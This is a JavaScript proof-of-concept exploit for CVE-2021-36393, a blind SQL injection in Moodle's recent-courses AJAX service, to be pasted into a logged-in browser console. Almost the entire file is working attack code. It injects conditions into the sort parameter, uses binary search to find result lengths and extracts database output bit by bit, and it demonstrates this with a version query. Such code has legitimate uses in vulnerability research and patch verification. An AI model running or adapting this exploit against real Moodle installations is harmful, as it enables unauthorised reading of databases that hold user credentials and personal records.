// CVE-2021-36393 PoC in JavaScript (just copy that into browser console)
// Moodle versions affected: 3.11, 3.10 to 3.10.4, 3.9 to 3.9.7 and earlier unsupported versions
// useful links:
// - https://security.snyk.io/vuln/SNYK-PHP-MOODLEMOODLE-3356636
// - https://moodle.org/mod/forum/discuss.php?d=424798
// - https://github.com/moodle/moodle/commit/68c90578e7a13cfa188bc07a9ce6fe02f9444d01
// - https://web.archive.org/web/20220201200500/https://0xkasper.com/articles/moodle-sql-injection-broken-access-control.html

function buildUrl() {
	const params = new URLSearchParams({
		sesskey: M.cfg.sesskey,
		info: "core_course_get_recent_courses",
	});

	return `${window.location.origin}/lib/ajax/service.php?${params}`;
}

function buildData(condition) {
	return JSON.stringify([
		{
			index: 0,
			methodname: "core_course_get_recent_courses",
			args: {
				sort: `IF((${condition}), timeaccess AND CAST(POW(2, 63) as UNSIGNED), timeaccess)`,
				limit: 0,
				offset: 1,
			},
		},
	]);
}

async function estimateResultLength(query) {
	let lo = 0;
	let hi = 512;

	while (lo <= hi) {
		let mid = Math.floor((lo + hi) / 2);

		const response = await fetch(buildUrl(), {
			method: "POST",
			body: buildData(`(SELECT ${mid} = LENGTH((${query})))`),
			credentials: "same-origin",
		});
		const json = await response.json();

		if (json[0].error === true) { //mid == item
			return mid;
		} else {
			const response = await fetch(buildUrl(), {
				method: "POST",
				body: buildData(`(SELECT ${mid} < LENGTH((${query})))`),
				credentials: "same-origin",
			});
			const json = await response.json();

			if (json[0].error === true) { //mid < item
				lo = mid + 1;
			} else if(json[0].error === false) { //mid > item
				hi = mid - 1;
			}
		}
	}

	return null;
}

async function executeQuery(query) {
	let bytes = [];
	const length = await estimateResultLength(query);
	for (let i = 0; i < length; i++) {
		let byte = 0;
		for (let bit_pos = 0; bit_pos < 8; bit_pos++) {
			const byte_pos = 1 + 2 * i;
			const response = await fetch(buildUrl(), {
				method: "POST",
				body: buildData(`(SELECT ((ORD(UNHEX(SUBSTRING(HEX((${query})), ${byte_pos}, 2))) >> ${bit_pos}) & 1) = 1)`),
				credentials: "same-origin",
			});

			const json = await response.json();
			if (json[0].error === true) {
				byte |= 1 << bit_pos;
			}
		}
		bytes.push(byte);
	}
	return new TextDecoder("utf-8").decode(new Uint8Array(bytes));
}

console.time("timer1");
console.log(await executeQuery("select version()"));
console.timeEnd("timer1");
